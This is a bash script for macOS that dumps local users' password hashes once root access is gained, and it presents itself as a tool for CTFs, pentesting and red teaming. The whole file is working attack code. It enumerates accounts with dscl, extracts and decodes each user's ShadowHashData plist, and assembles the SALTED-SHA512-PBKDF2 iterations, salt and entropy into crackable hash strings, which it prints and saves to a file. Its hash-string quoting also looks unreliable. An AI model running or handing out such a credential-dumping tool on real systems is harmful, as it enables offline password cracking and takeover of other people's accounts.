#!/bin/bash

# /!\ Note : this script is intended to be used on a Mac OS computer on you ALREADY gained
# root access. Retreiving user's hash is always useful for CTFs, pentesting or red teaming operations.

# Check if script is ran as root
if [ "$EUID" -ne 0 ]
  then echo "You need to be root on the machine to access users's .plists. Exiting..."
  exit
fi

# Check if arguments provided
if [ "$#" -ne 2 ]; then
    echo "Please provide a name for the hash output, and the path to save the .plist file : $0 <input_filename> /path/to/.plist"
    exit 1	
fi

# File output in arg
FINAL_HASH="$1"
# Output directory for hash files
OUTPUT_DIR="$2"
echo -e "Hash will are saved into : $FINAL_HASH\nAnd .plist files to : $OUTPUT_DIR"

RED='\033[0;31m'   #'0;31' is Red's ANSI color code
GREEN='\033[32m'   #'0;32' is Green's ANSI color code
YELLOW='\033[1;32m'   #'1;32' is Yellow's ANSI color code
BLUE='\033[0;34m'   #'0;34' is Blue's ANSI color code

# Create the output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR"

# Iterating through each user
getPlist()
{
	# Listing existing users on the system, using the dscl utility
	USERS=$(dscl . -list /Users | grep -v -e "^_" -e "daemon" -e "root" -e "nobody")
	# Assign users to an array called "user_lines", called in getPlist()
	IFS=$'\n' read -rd '' -a user_lines <<< "$USERS"
	# Increment through users
	# Going throughout the array "user_lines"
	for USER in "${user_lines[@]}"; do
    	# Extracting .plist of each user
    	PLIST_DATA=$(dscl . -read "/Users/$USER" dsAttrTypeNative:ShadowHashData)
    	# Saving .plist
    	echo "$PLIST_DATA" > "$OUTPUT_DIR/$USER.plist"
    	# Convert the hex users's data to XML format, and then save them into separated user's hash
    	FULL_PLIST=$(cat "$OUTPUT_DIR/$USER.plist" | tail -n 1 | xxd -p -r | plutil -convert xml1 - -o $OUTPUT_DIR/$USER.plist)
	done
}

getFullHashes()
{
    echo -e "\nHere is the hash for each user found on the system : \n"
    
    # Iterating to each users
    counterUser=0
    for USER in "${user_lines[@]}"; do
        ((counterUser++))
        
        # Retrieving .plist file and decode them
        PLIST_DATA=$(dscl . -read "/Users/$USER" dsAttrTypeNative:ShadowHashData)
        FULL_PLIST=$(cat "$OUTPUT_DIR/$USER.plist" | tail -n 1 | xxd -p -r | plutil -convert xml1 - -o $OUTPUT_DIR/$USER.plist)

        # Extracting the required hash-related data
        INTEGER_VALUE=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="iterations"]/following-sibling::integer[1]/text()' "$OUTPUT_DIR/$USER.plist")
        HASH_SECOND_DATA_BLOCK=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="salt"]/following-sibling::data[1]/text()' "$OUTPUT_DIR/$USER.plist" | awk '{$1=$1};1' | tr -d '\n' | base64 -d | xxd -p -c 256)
        HASH_FIRST_DATA_BLOCK=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="entropy"]/following-sibling::data[1]/text()' "$OUTPUT_DIR/$USER.plist" | base64 -d | xxd -p -c 256)

        # Concatenate the extracted data into a single hash format with salt
        USER_HASH=""$"ml$"$INTEGER_VALUE$"$"$HASH_SECOND_DATA_BLOCK$"$"$HASH_FIRST_DATA_BLOCK
		USER_HASH="$ml$""$USER_HASH"
        
        # Outputing users and hashes in a fancy way
		echo -e "${YELLOW}User #$counterUser"
        echo -e "${YELLOW}Username:\033[0m $USER"
        echo -e "${RED}Hash:\033[0m $USER_HASH\n"
        echo -e "$USER_HASH\n" >> "$FINAL_HASH"
    done
}

# Calling functions
getPlist
getFullHashes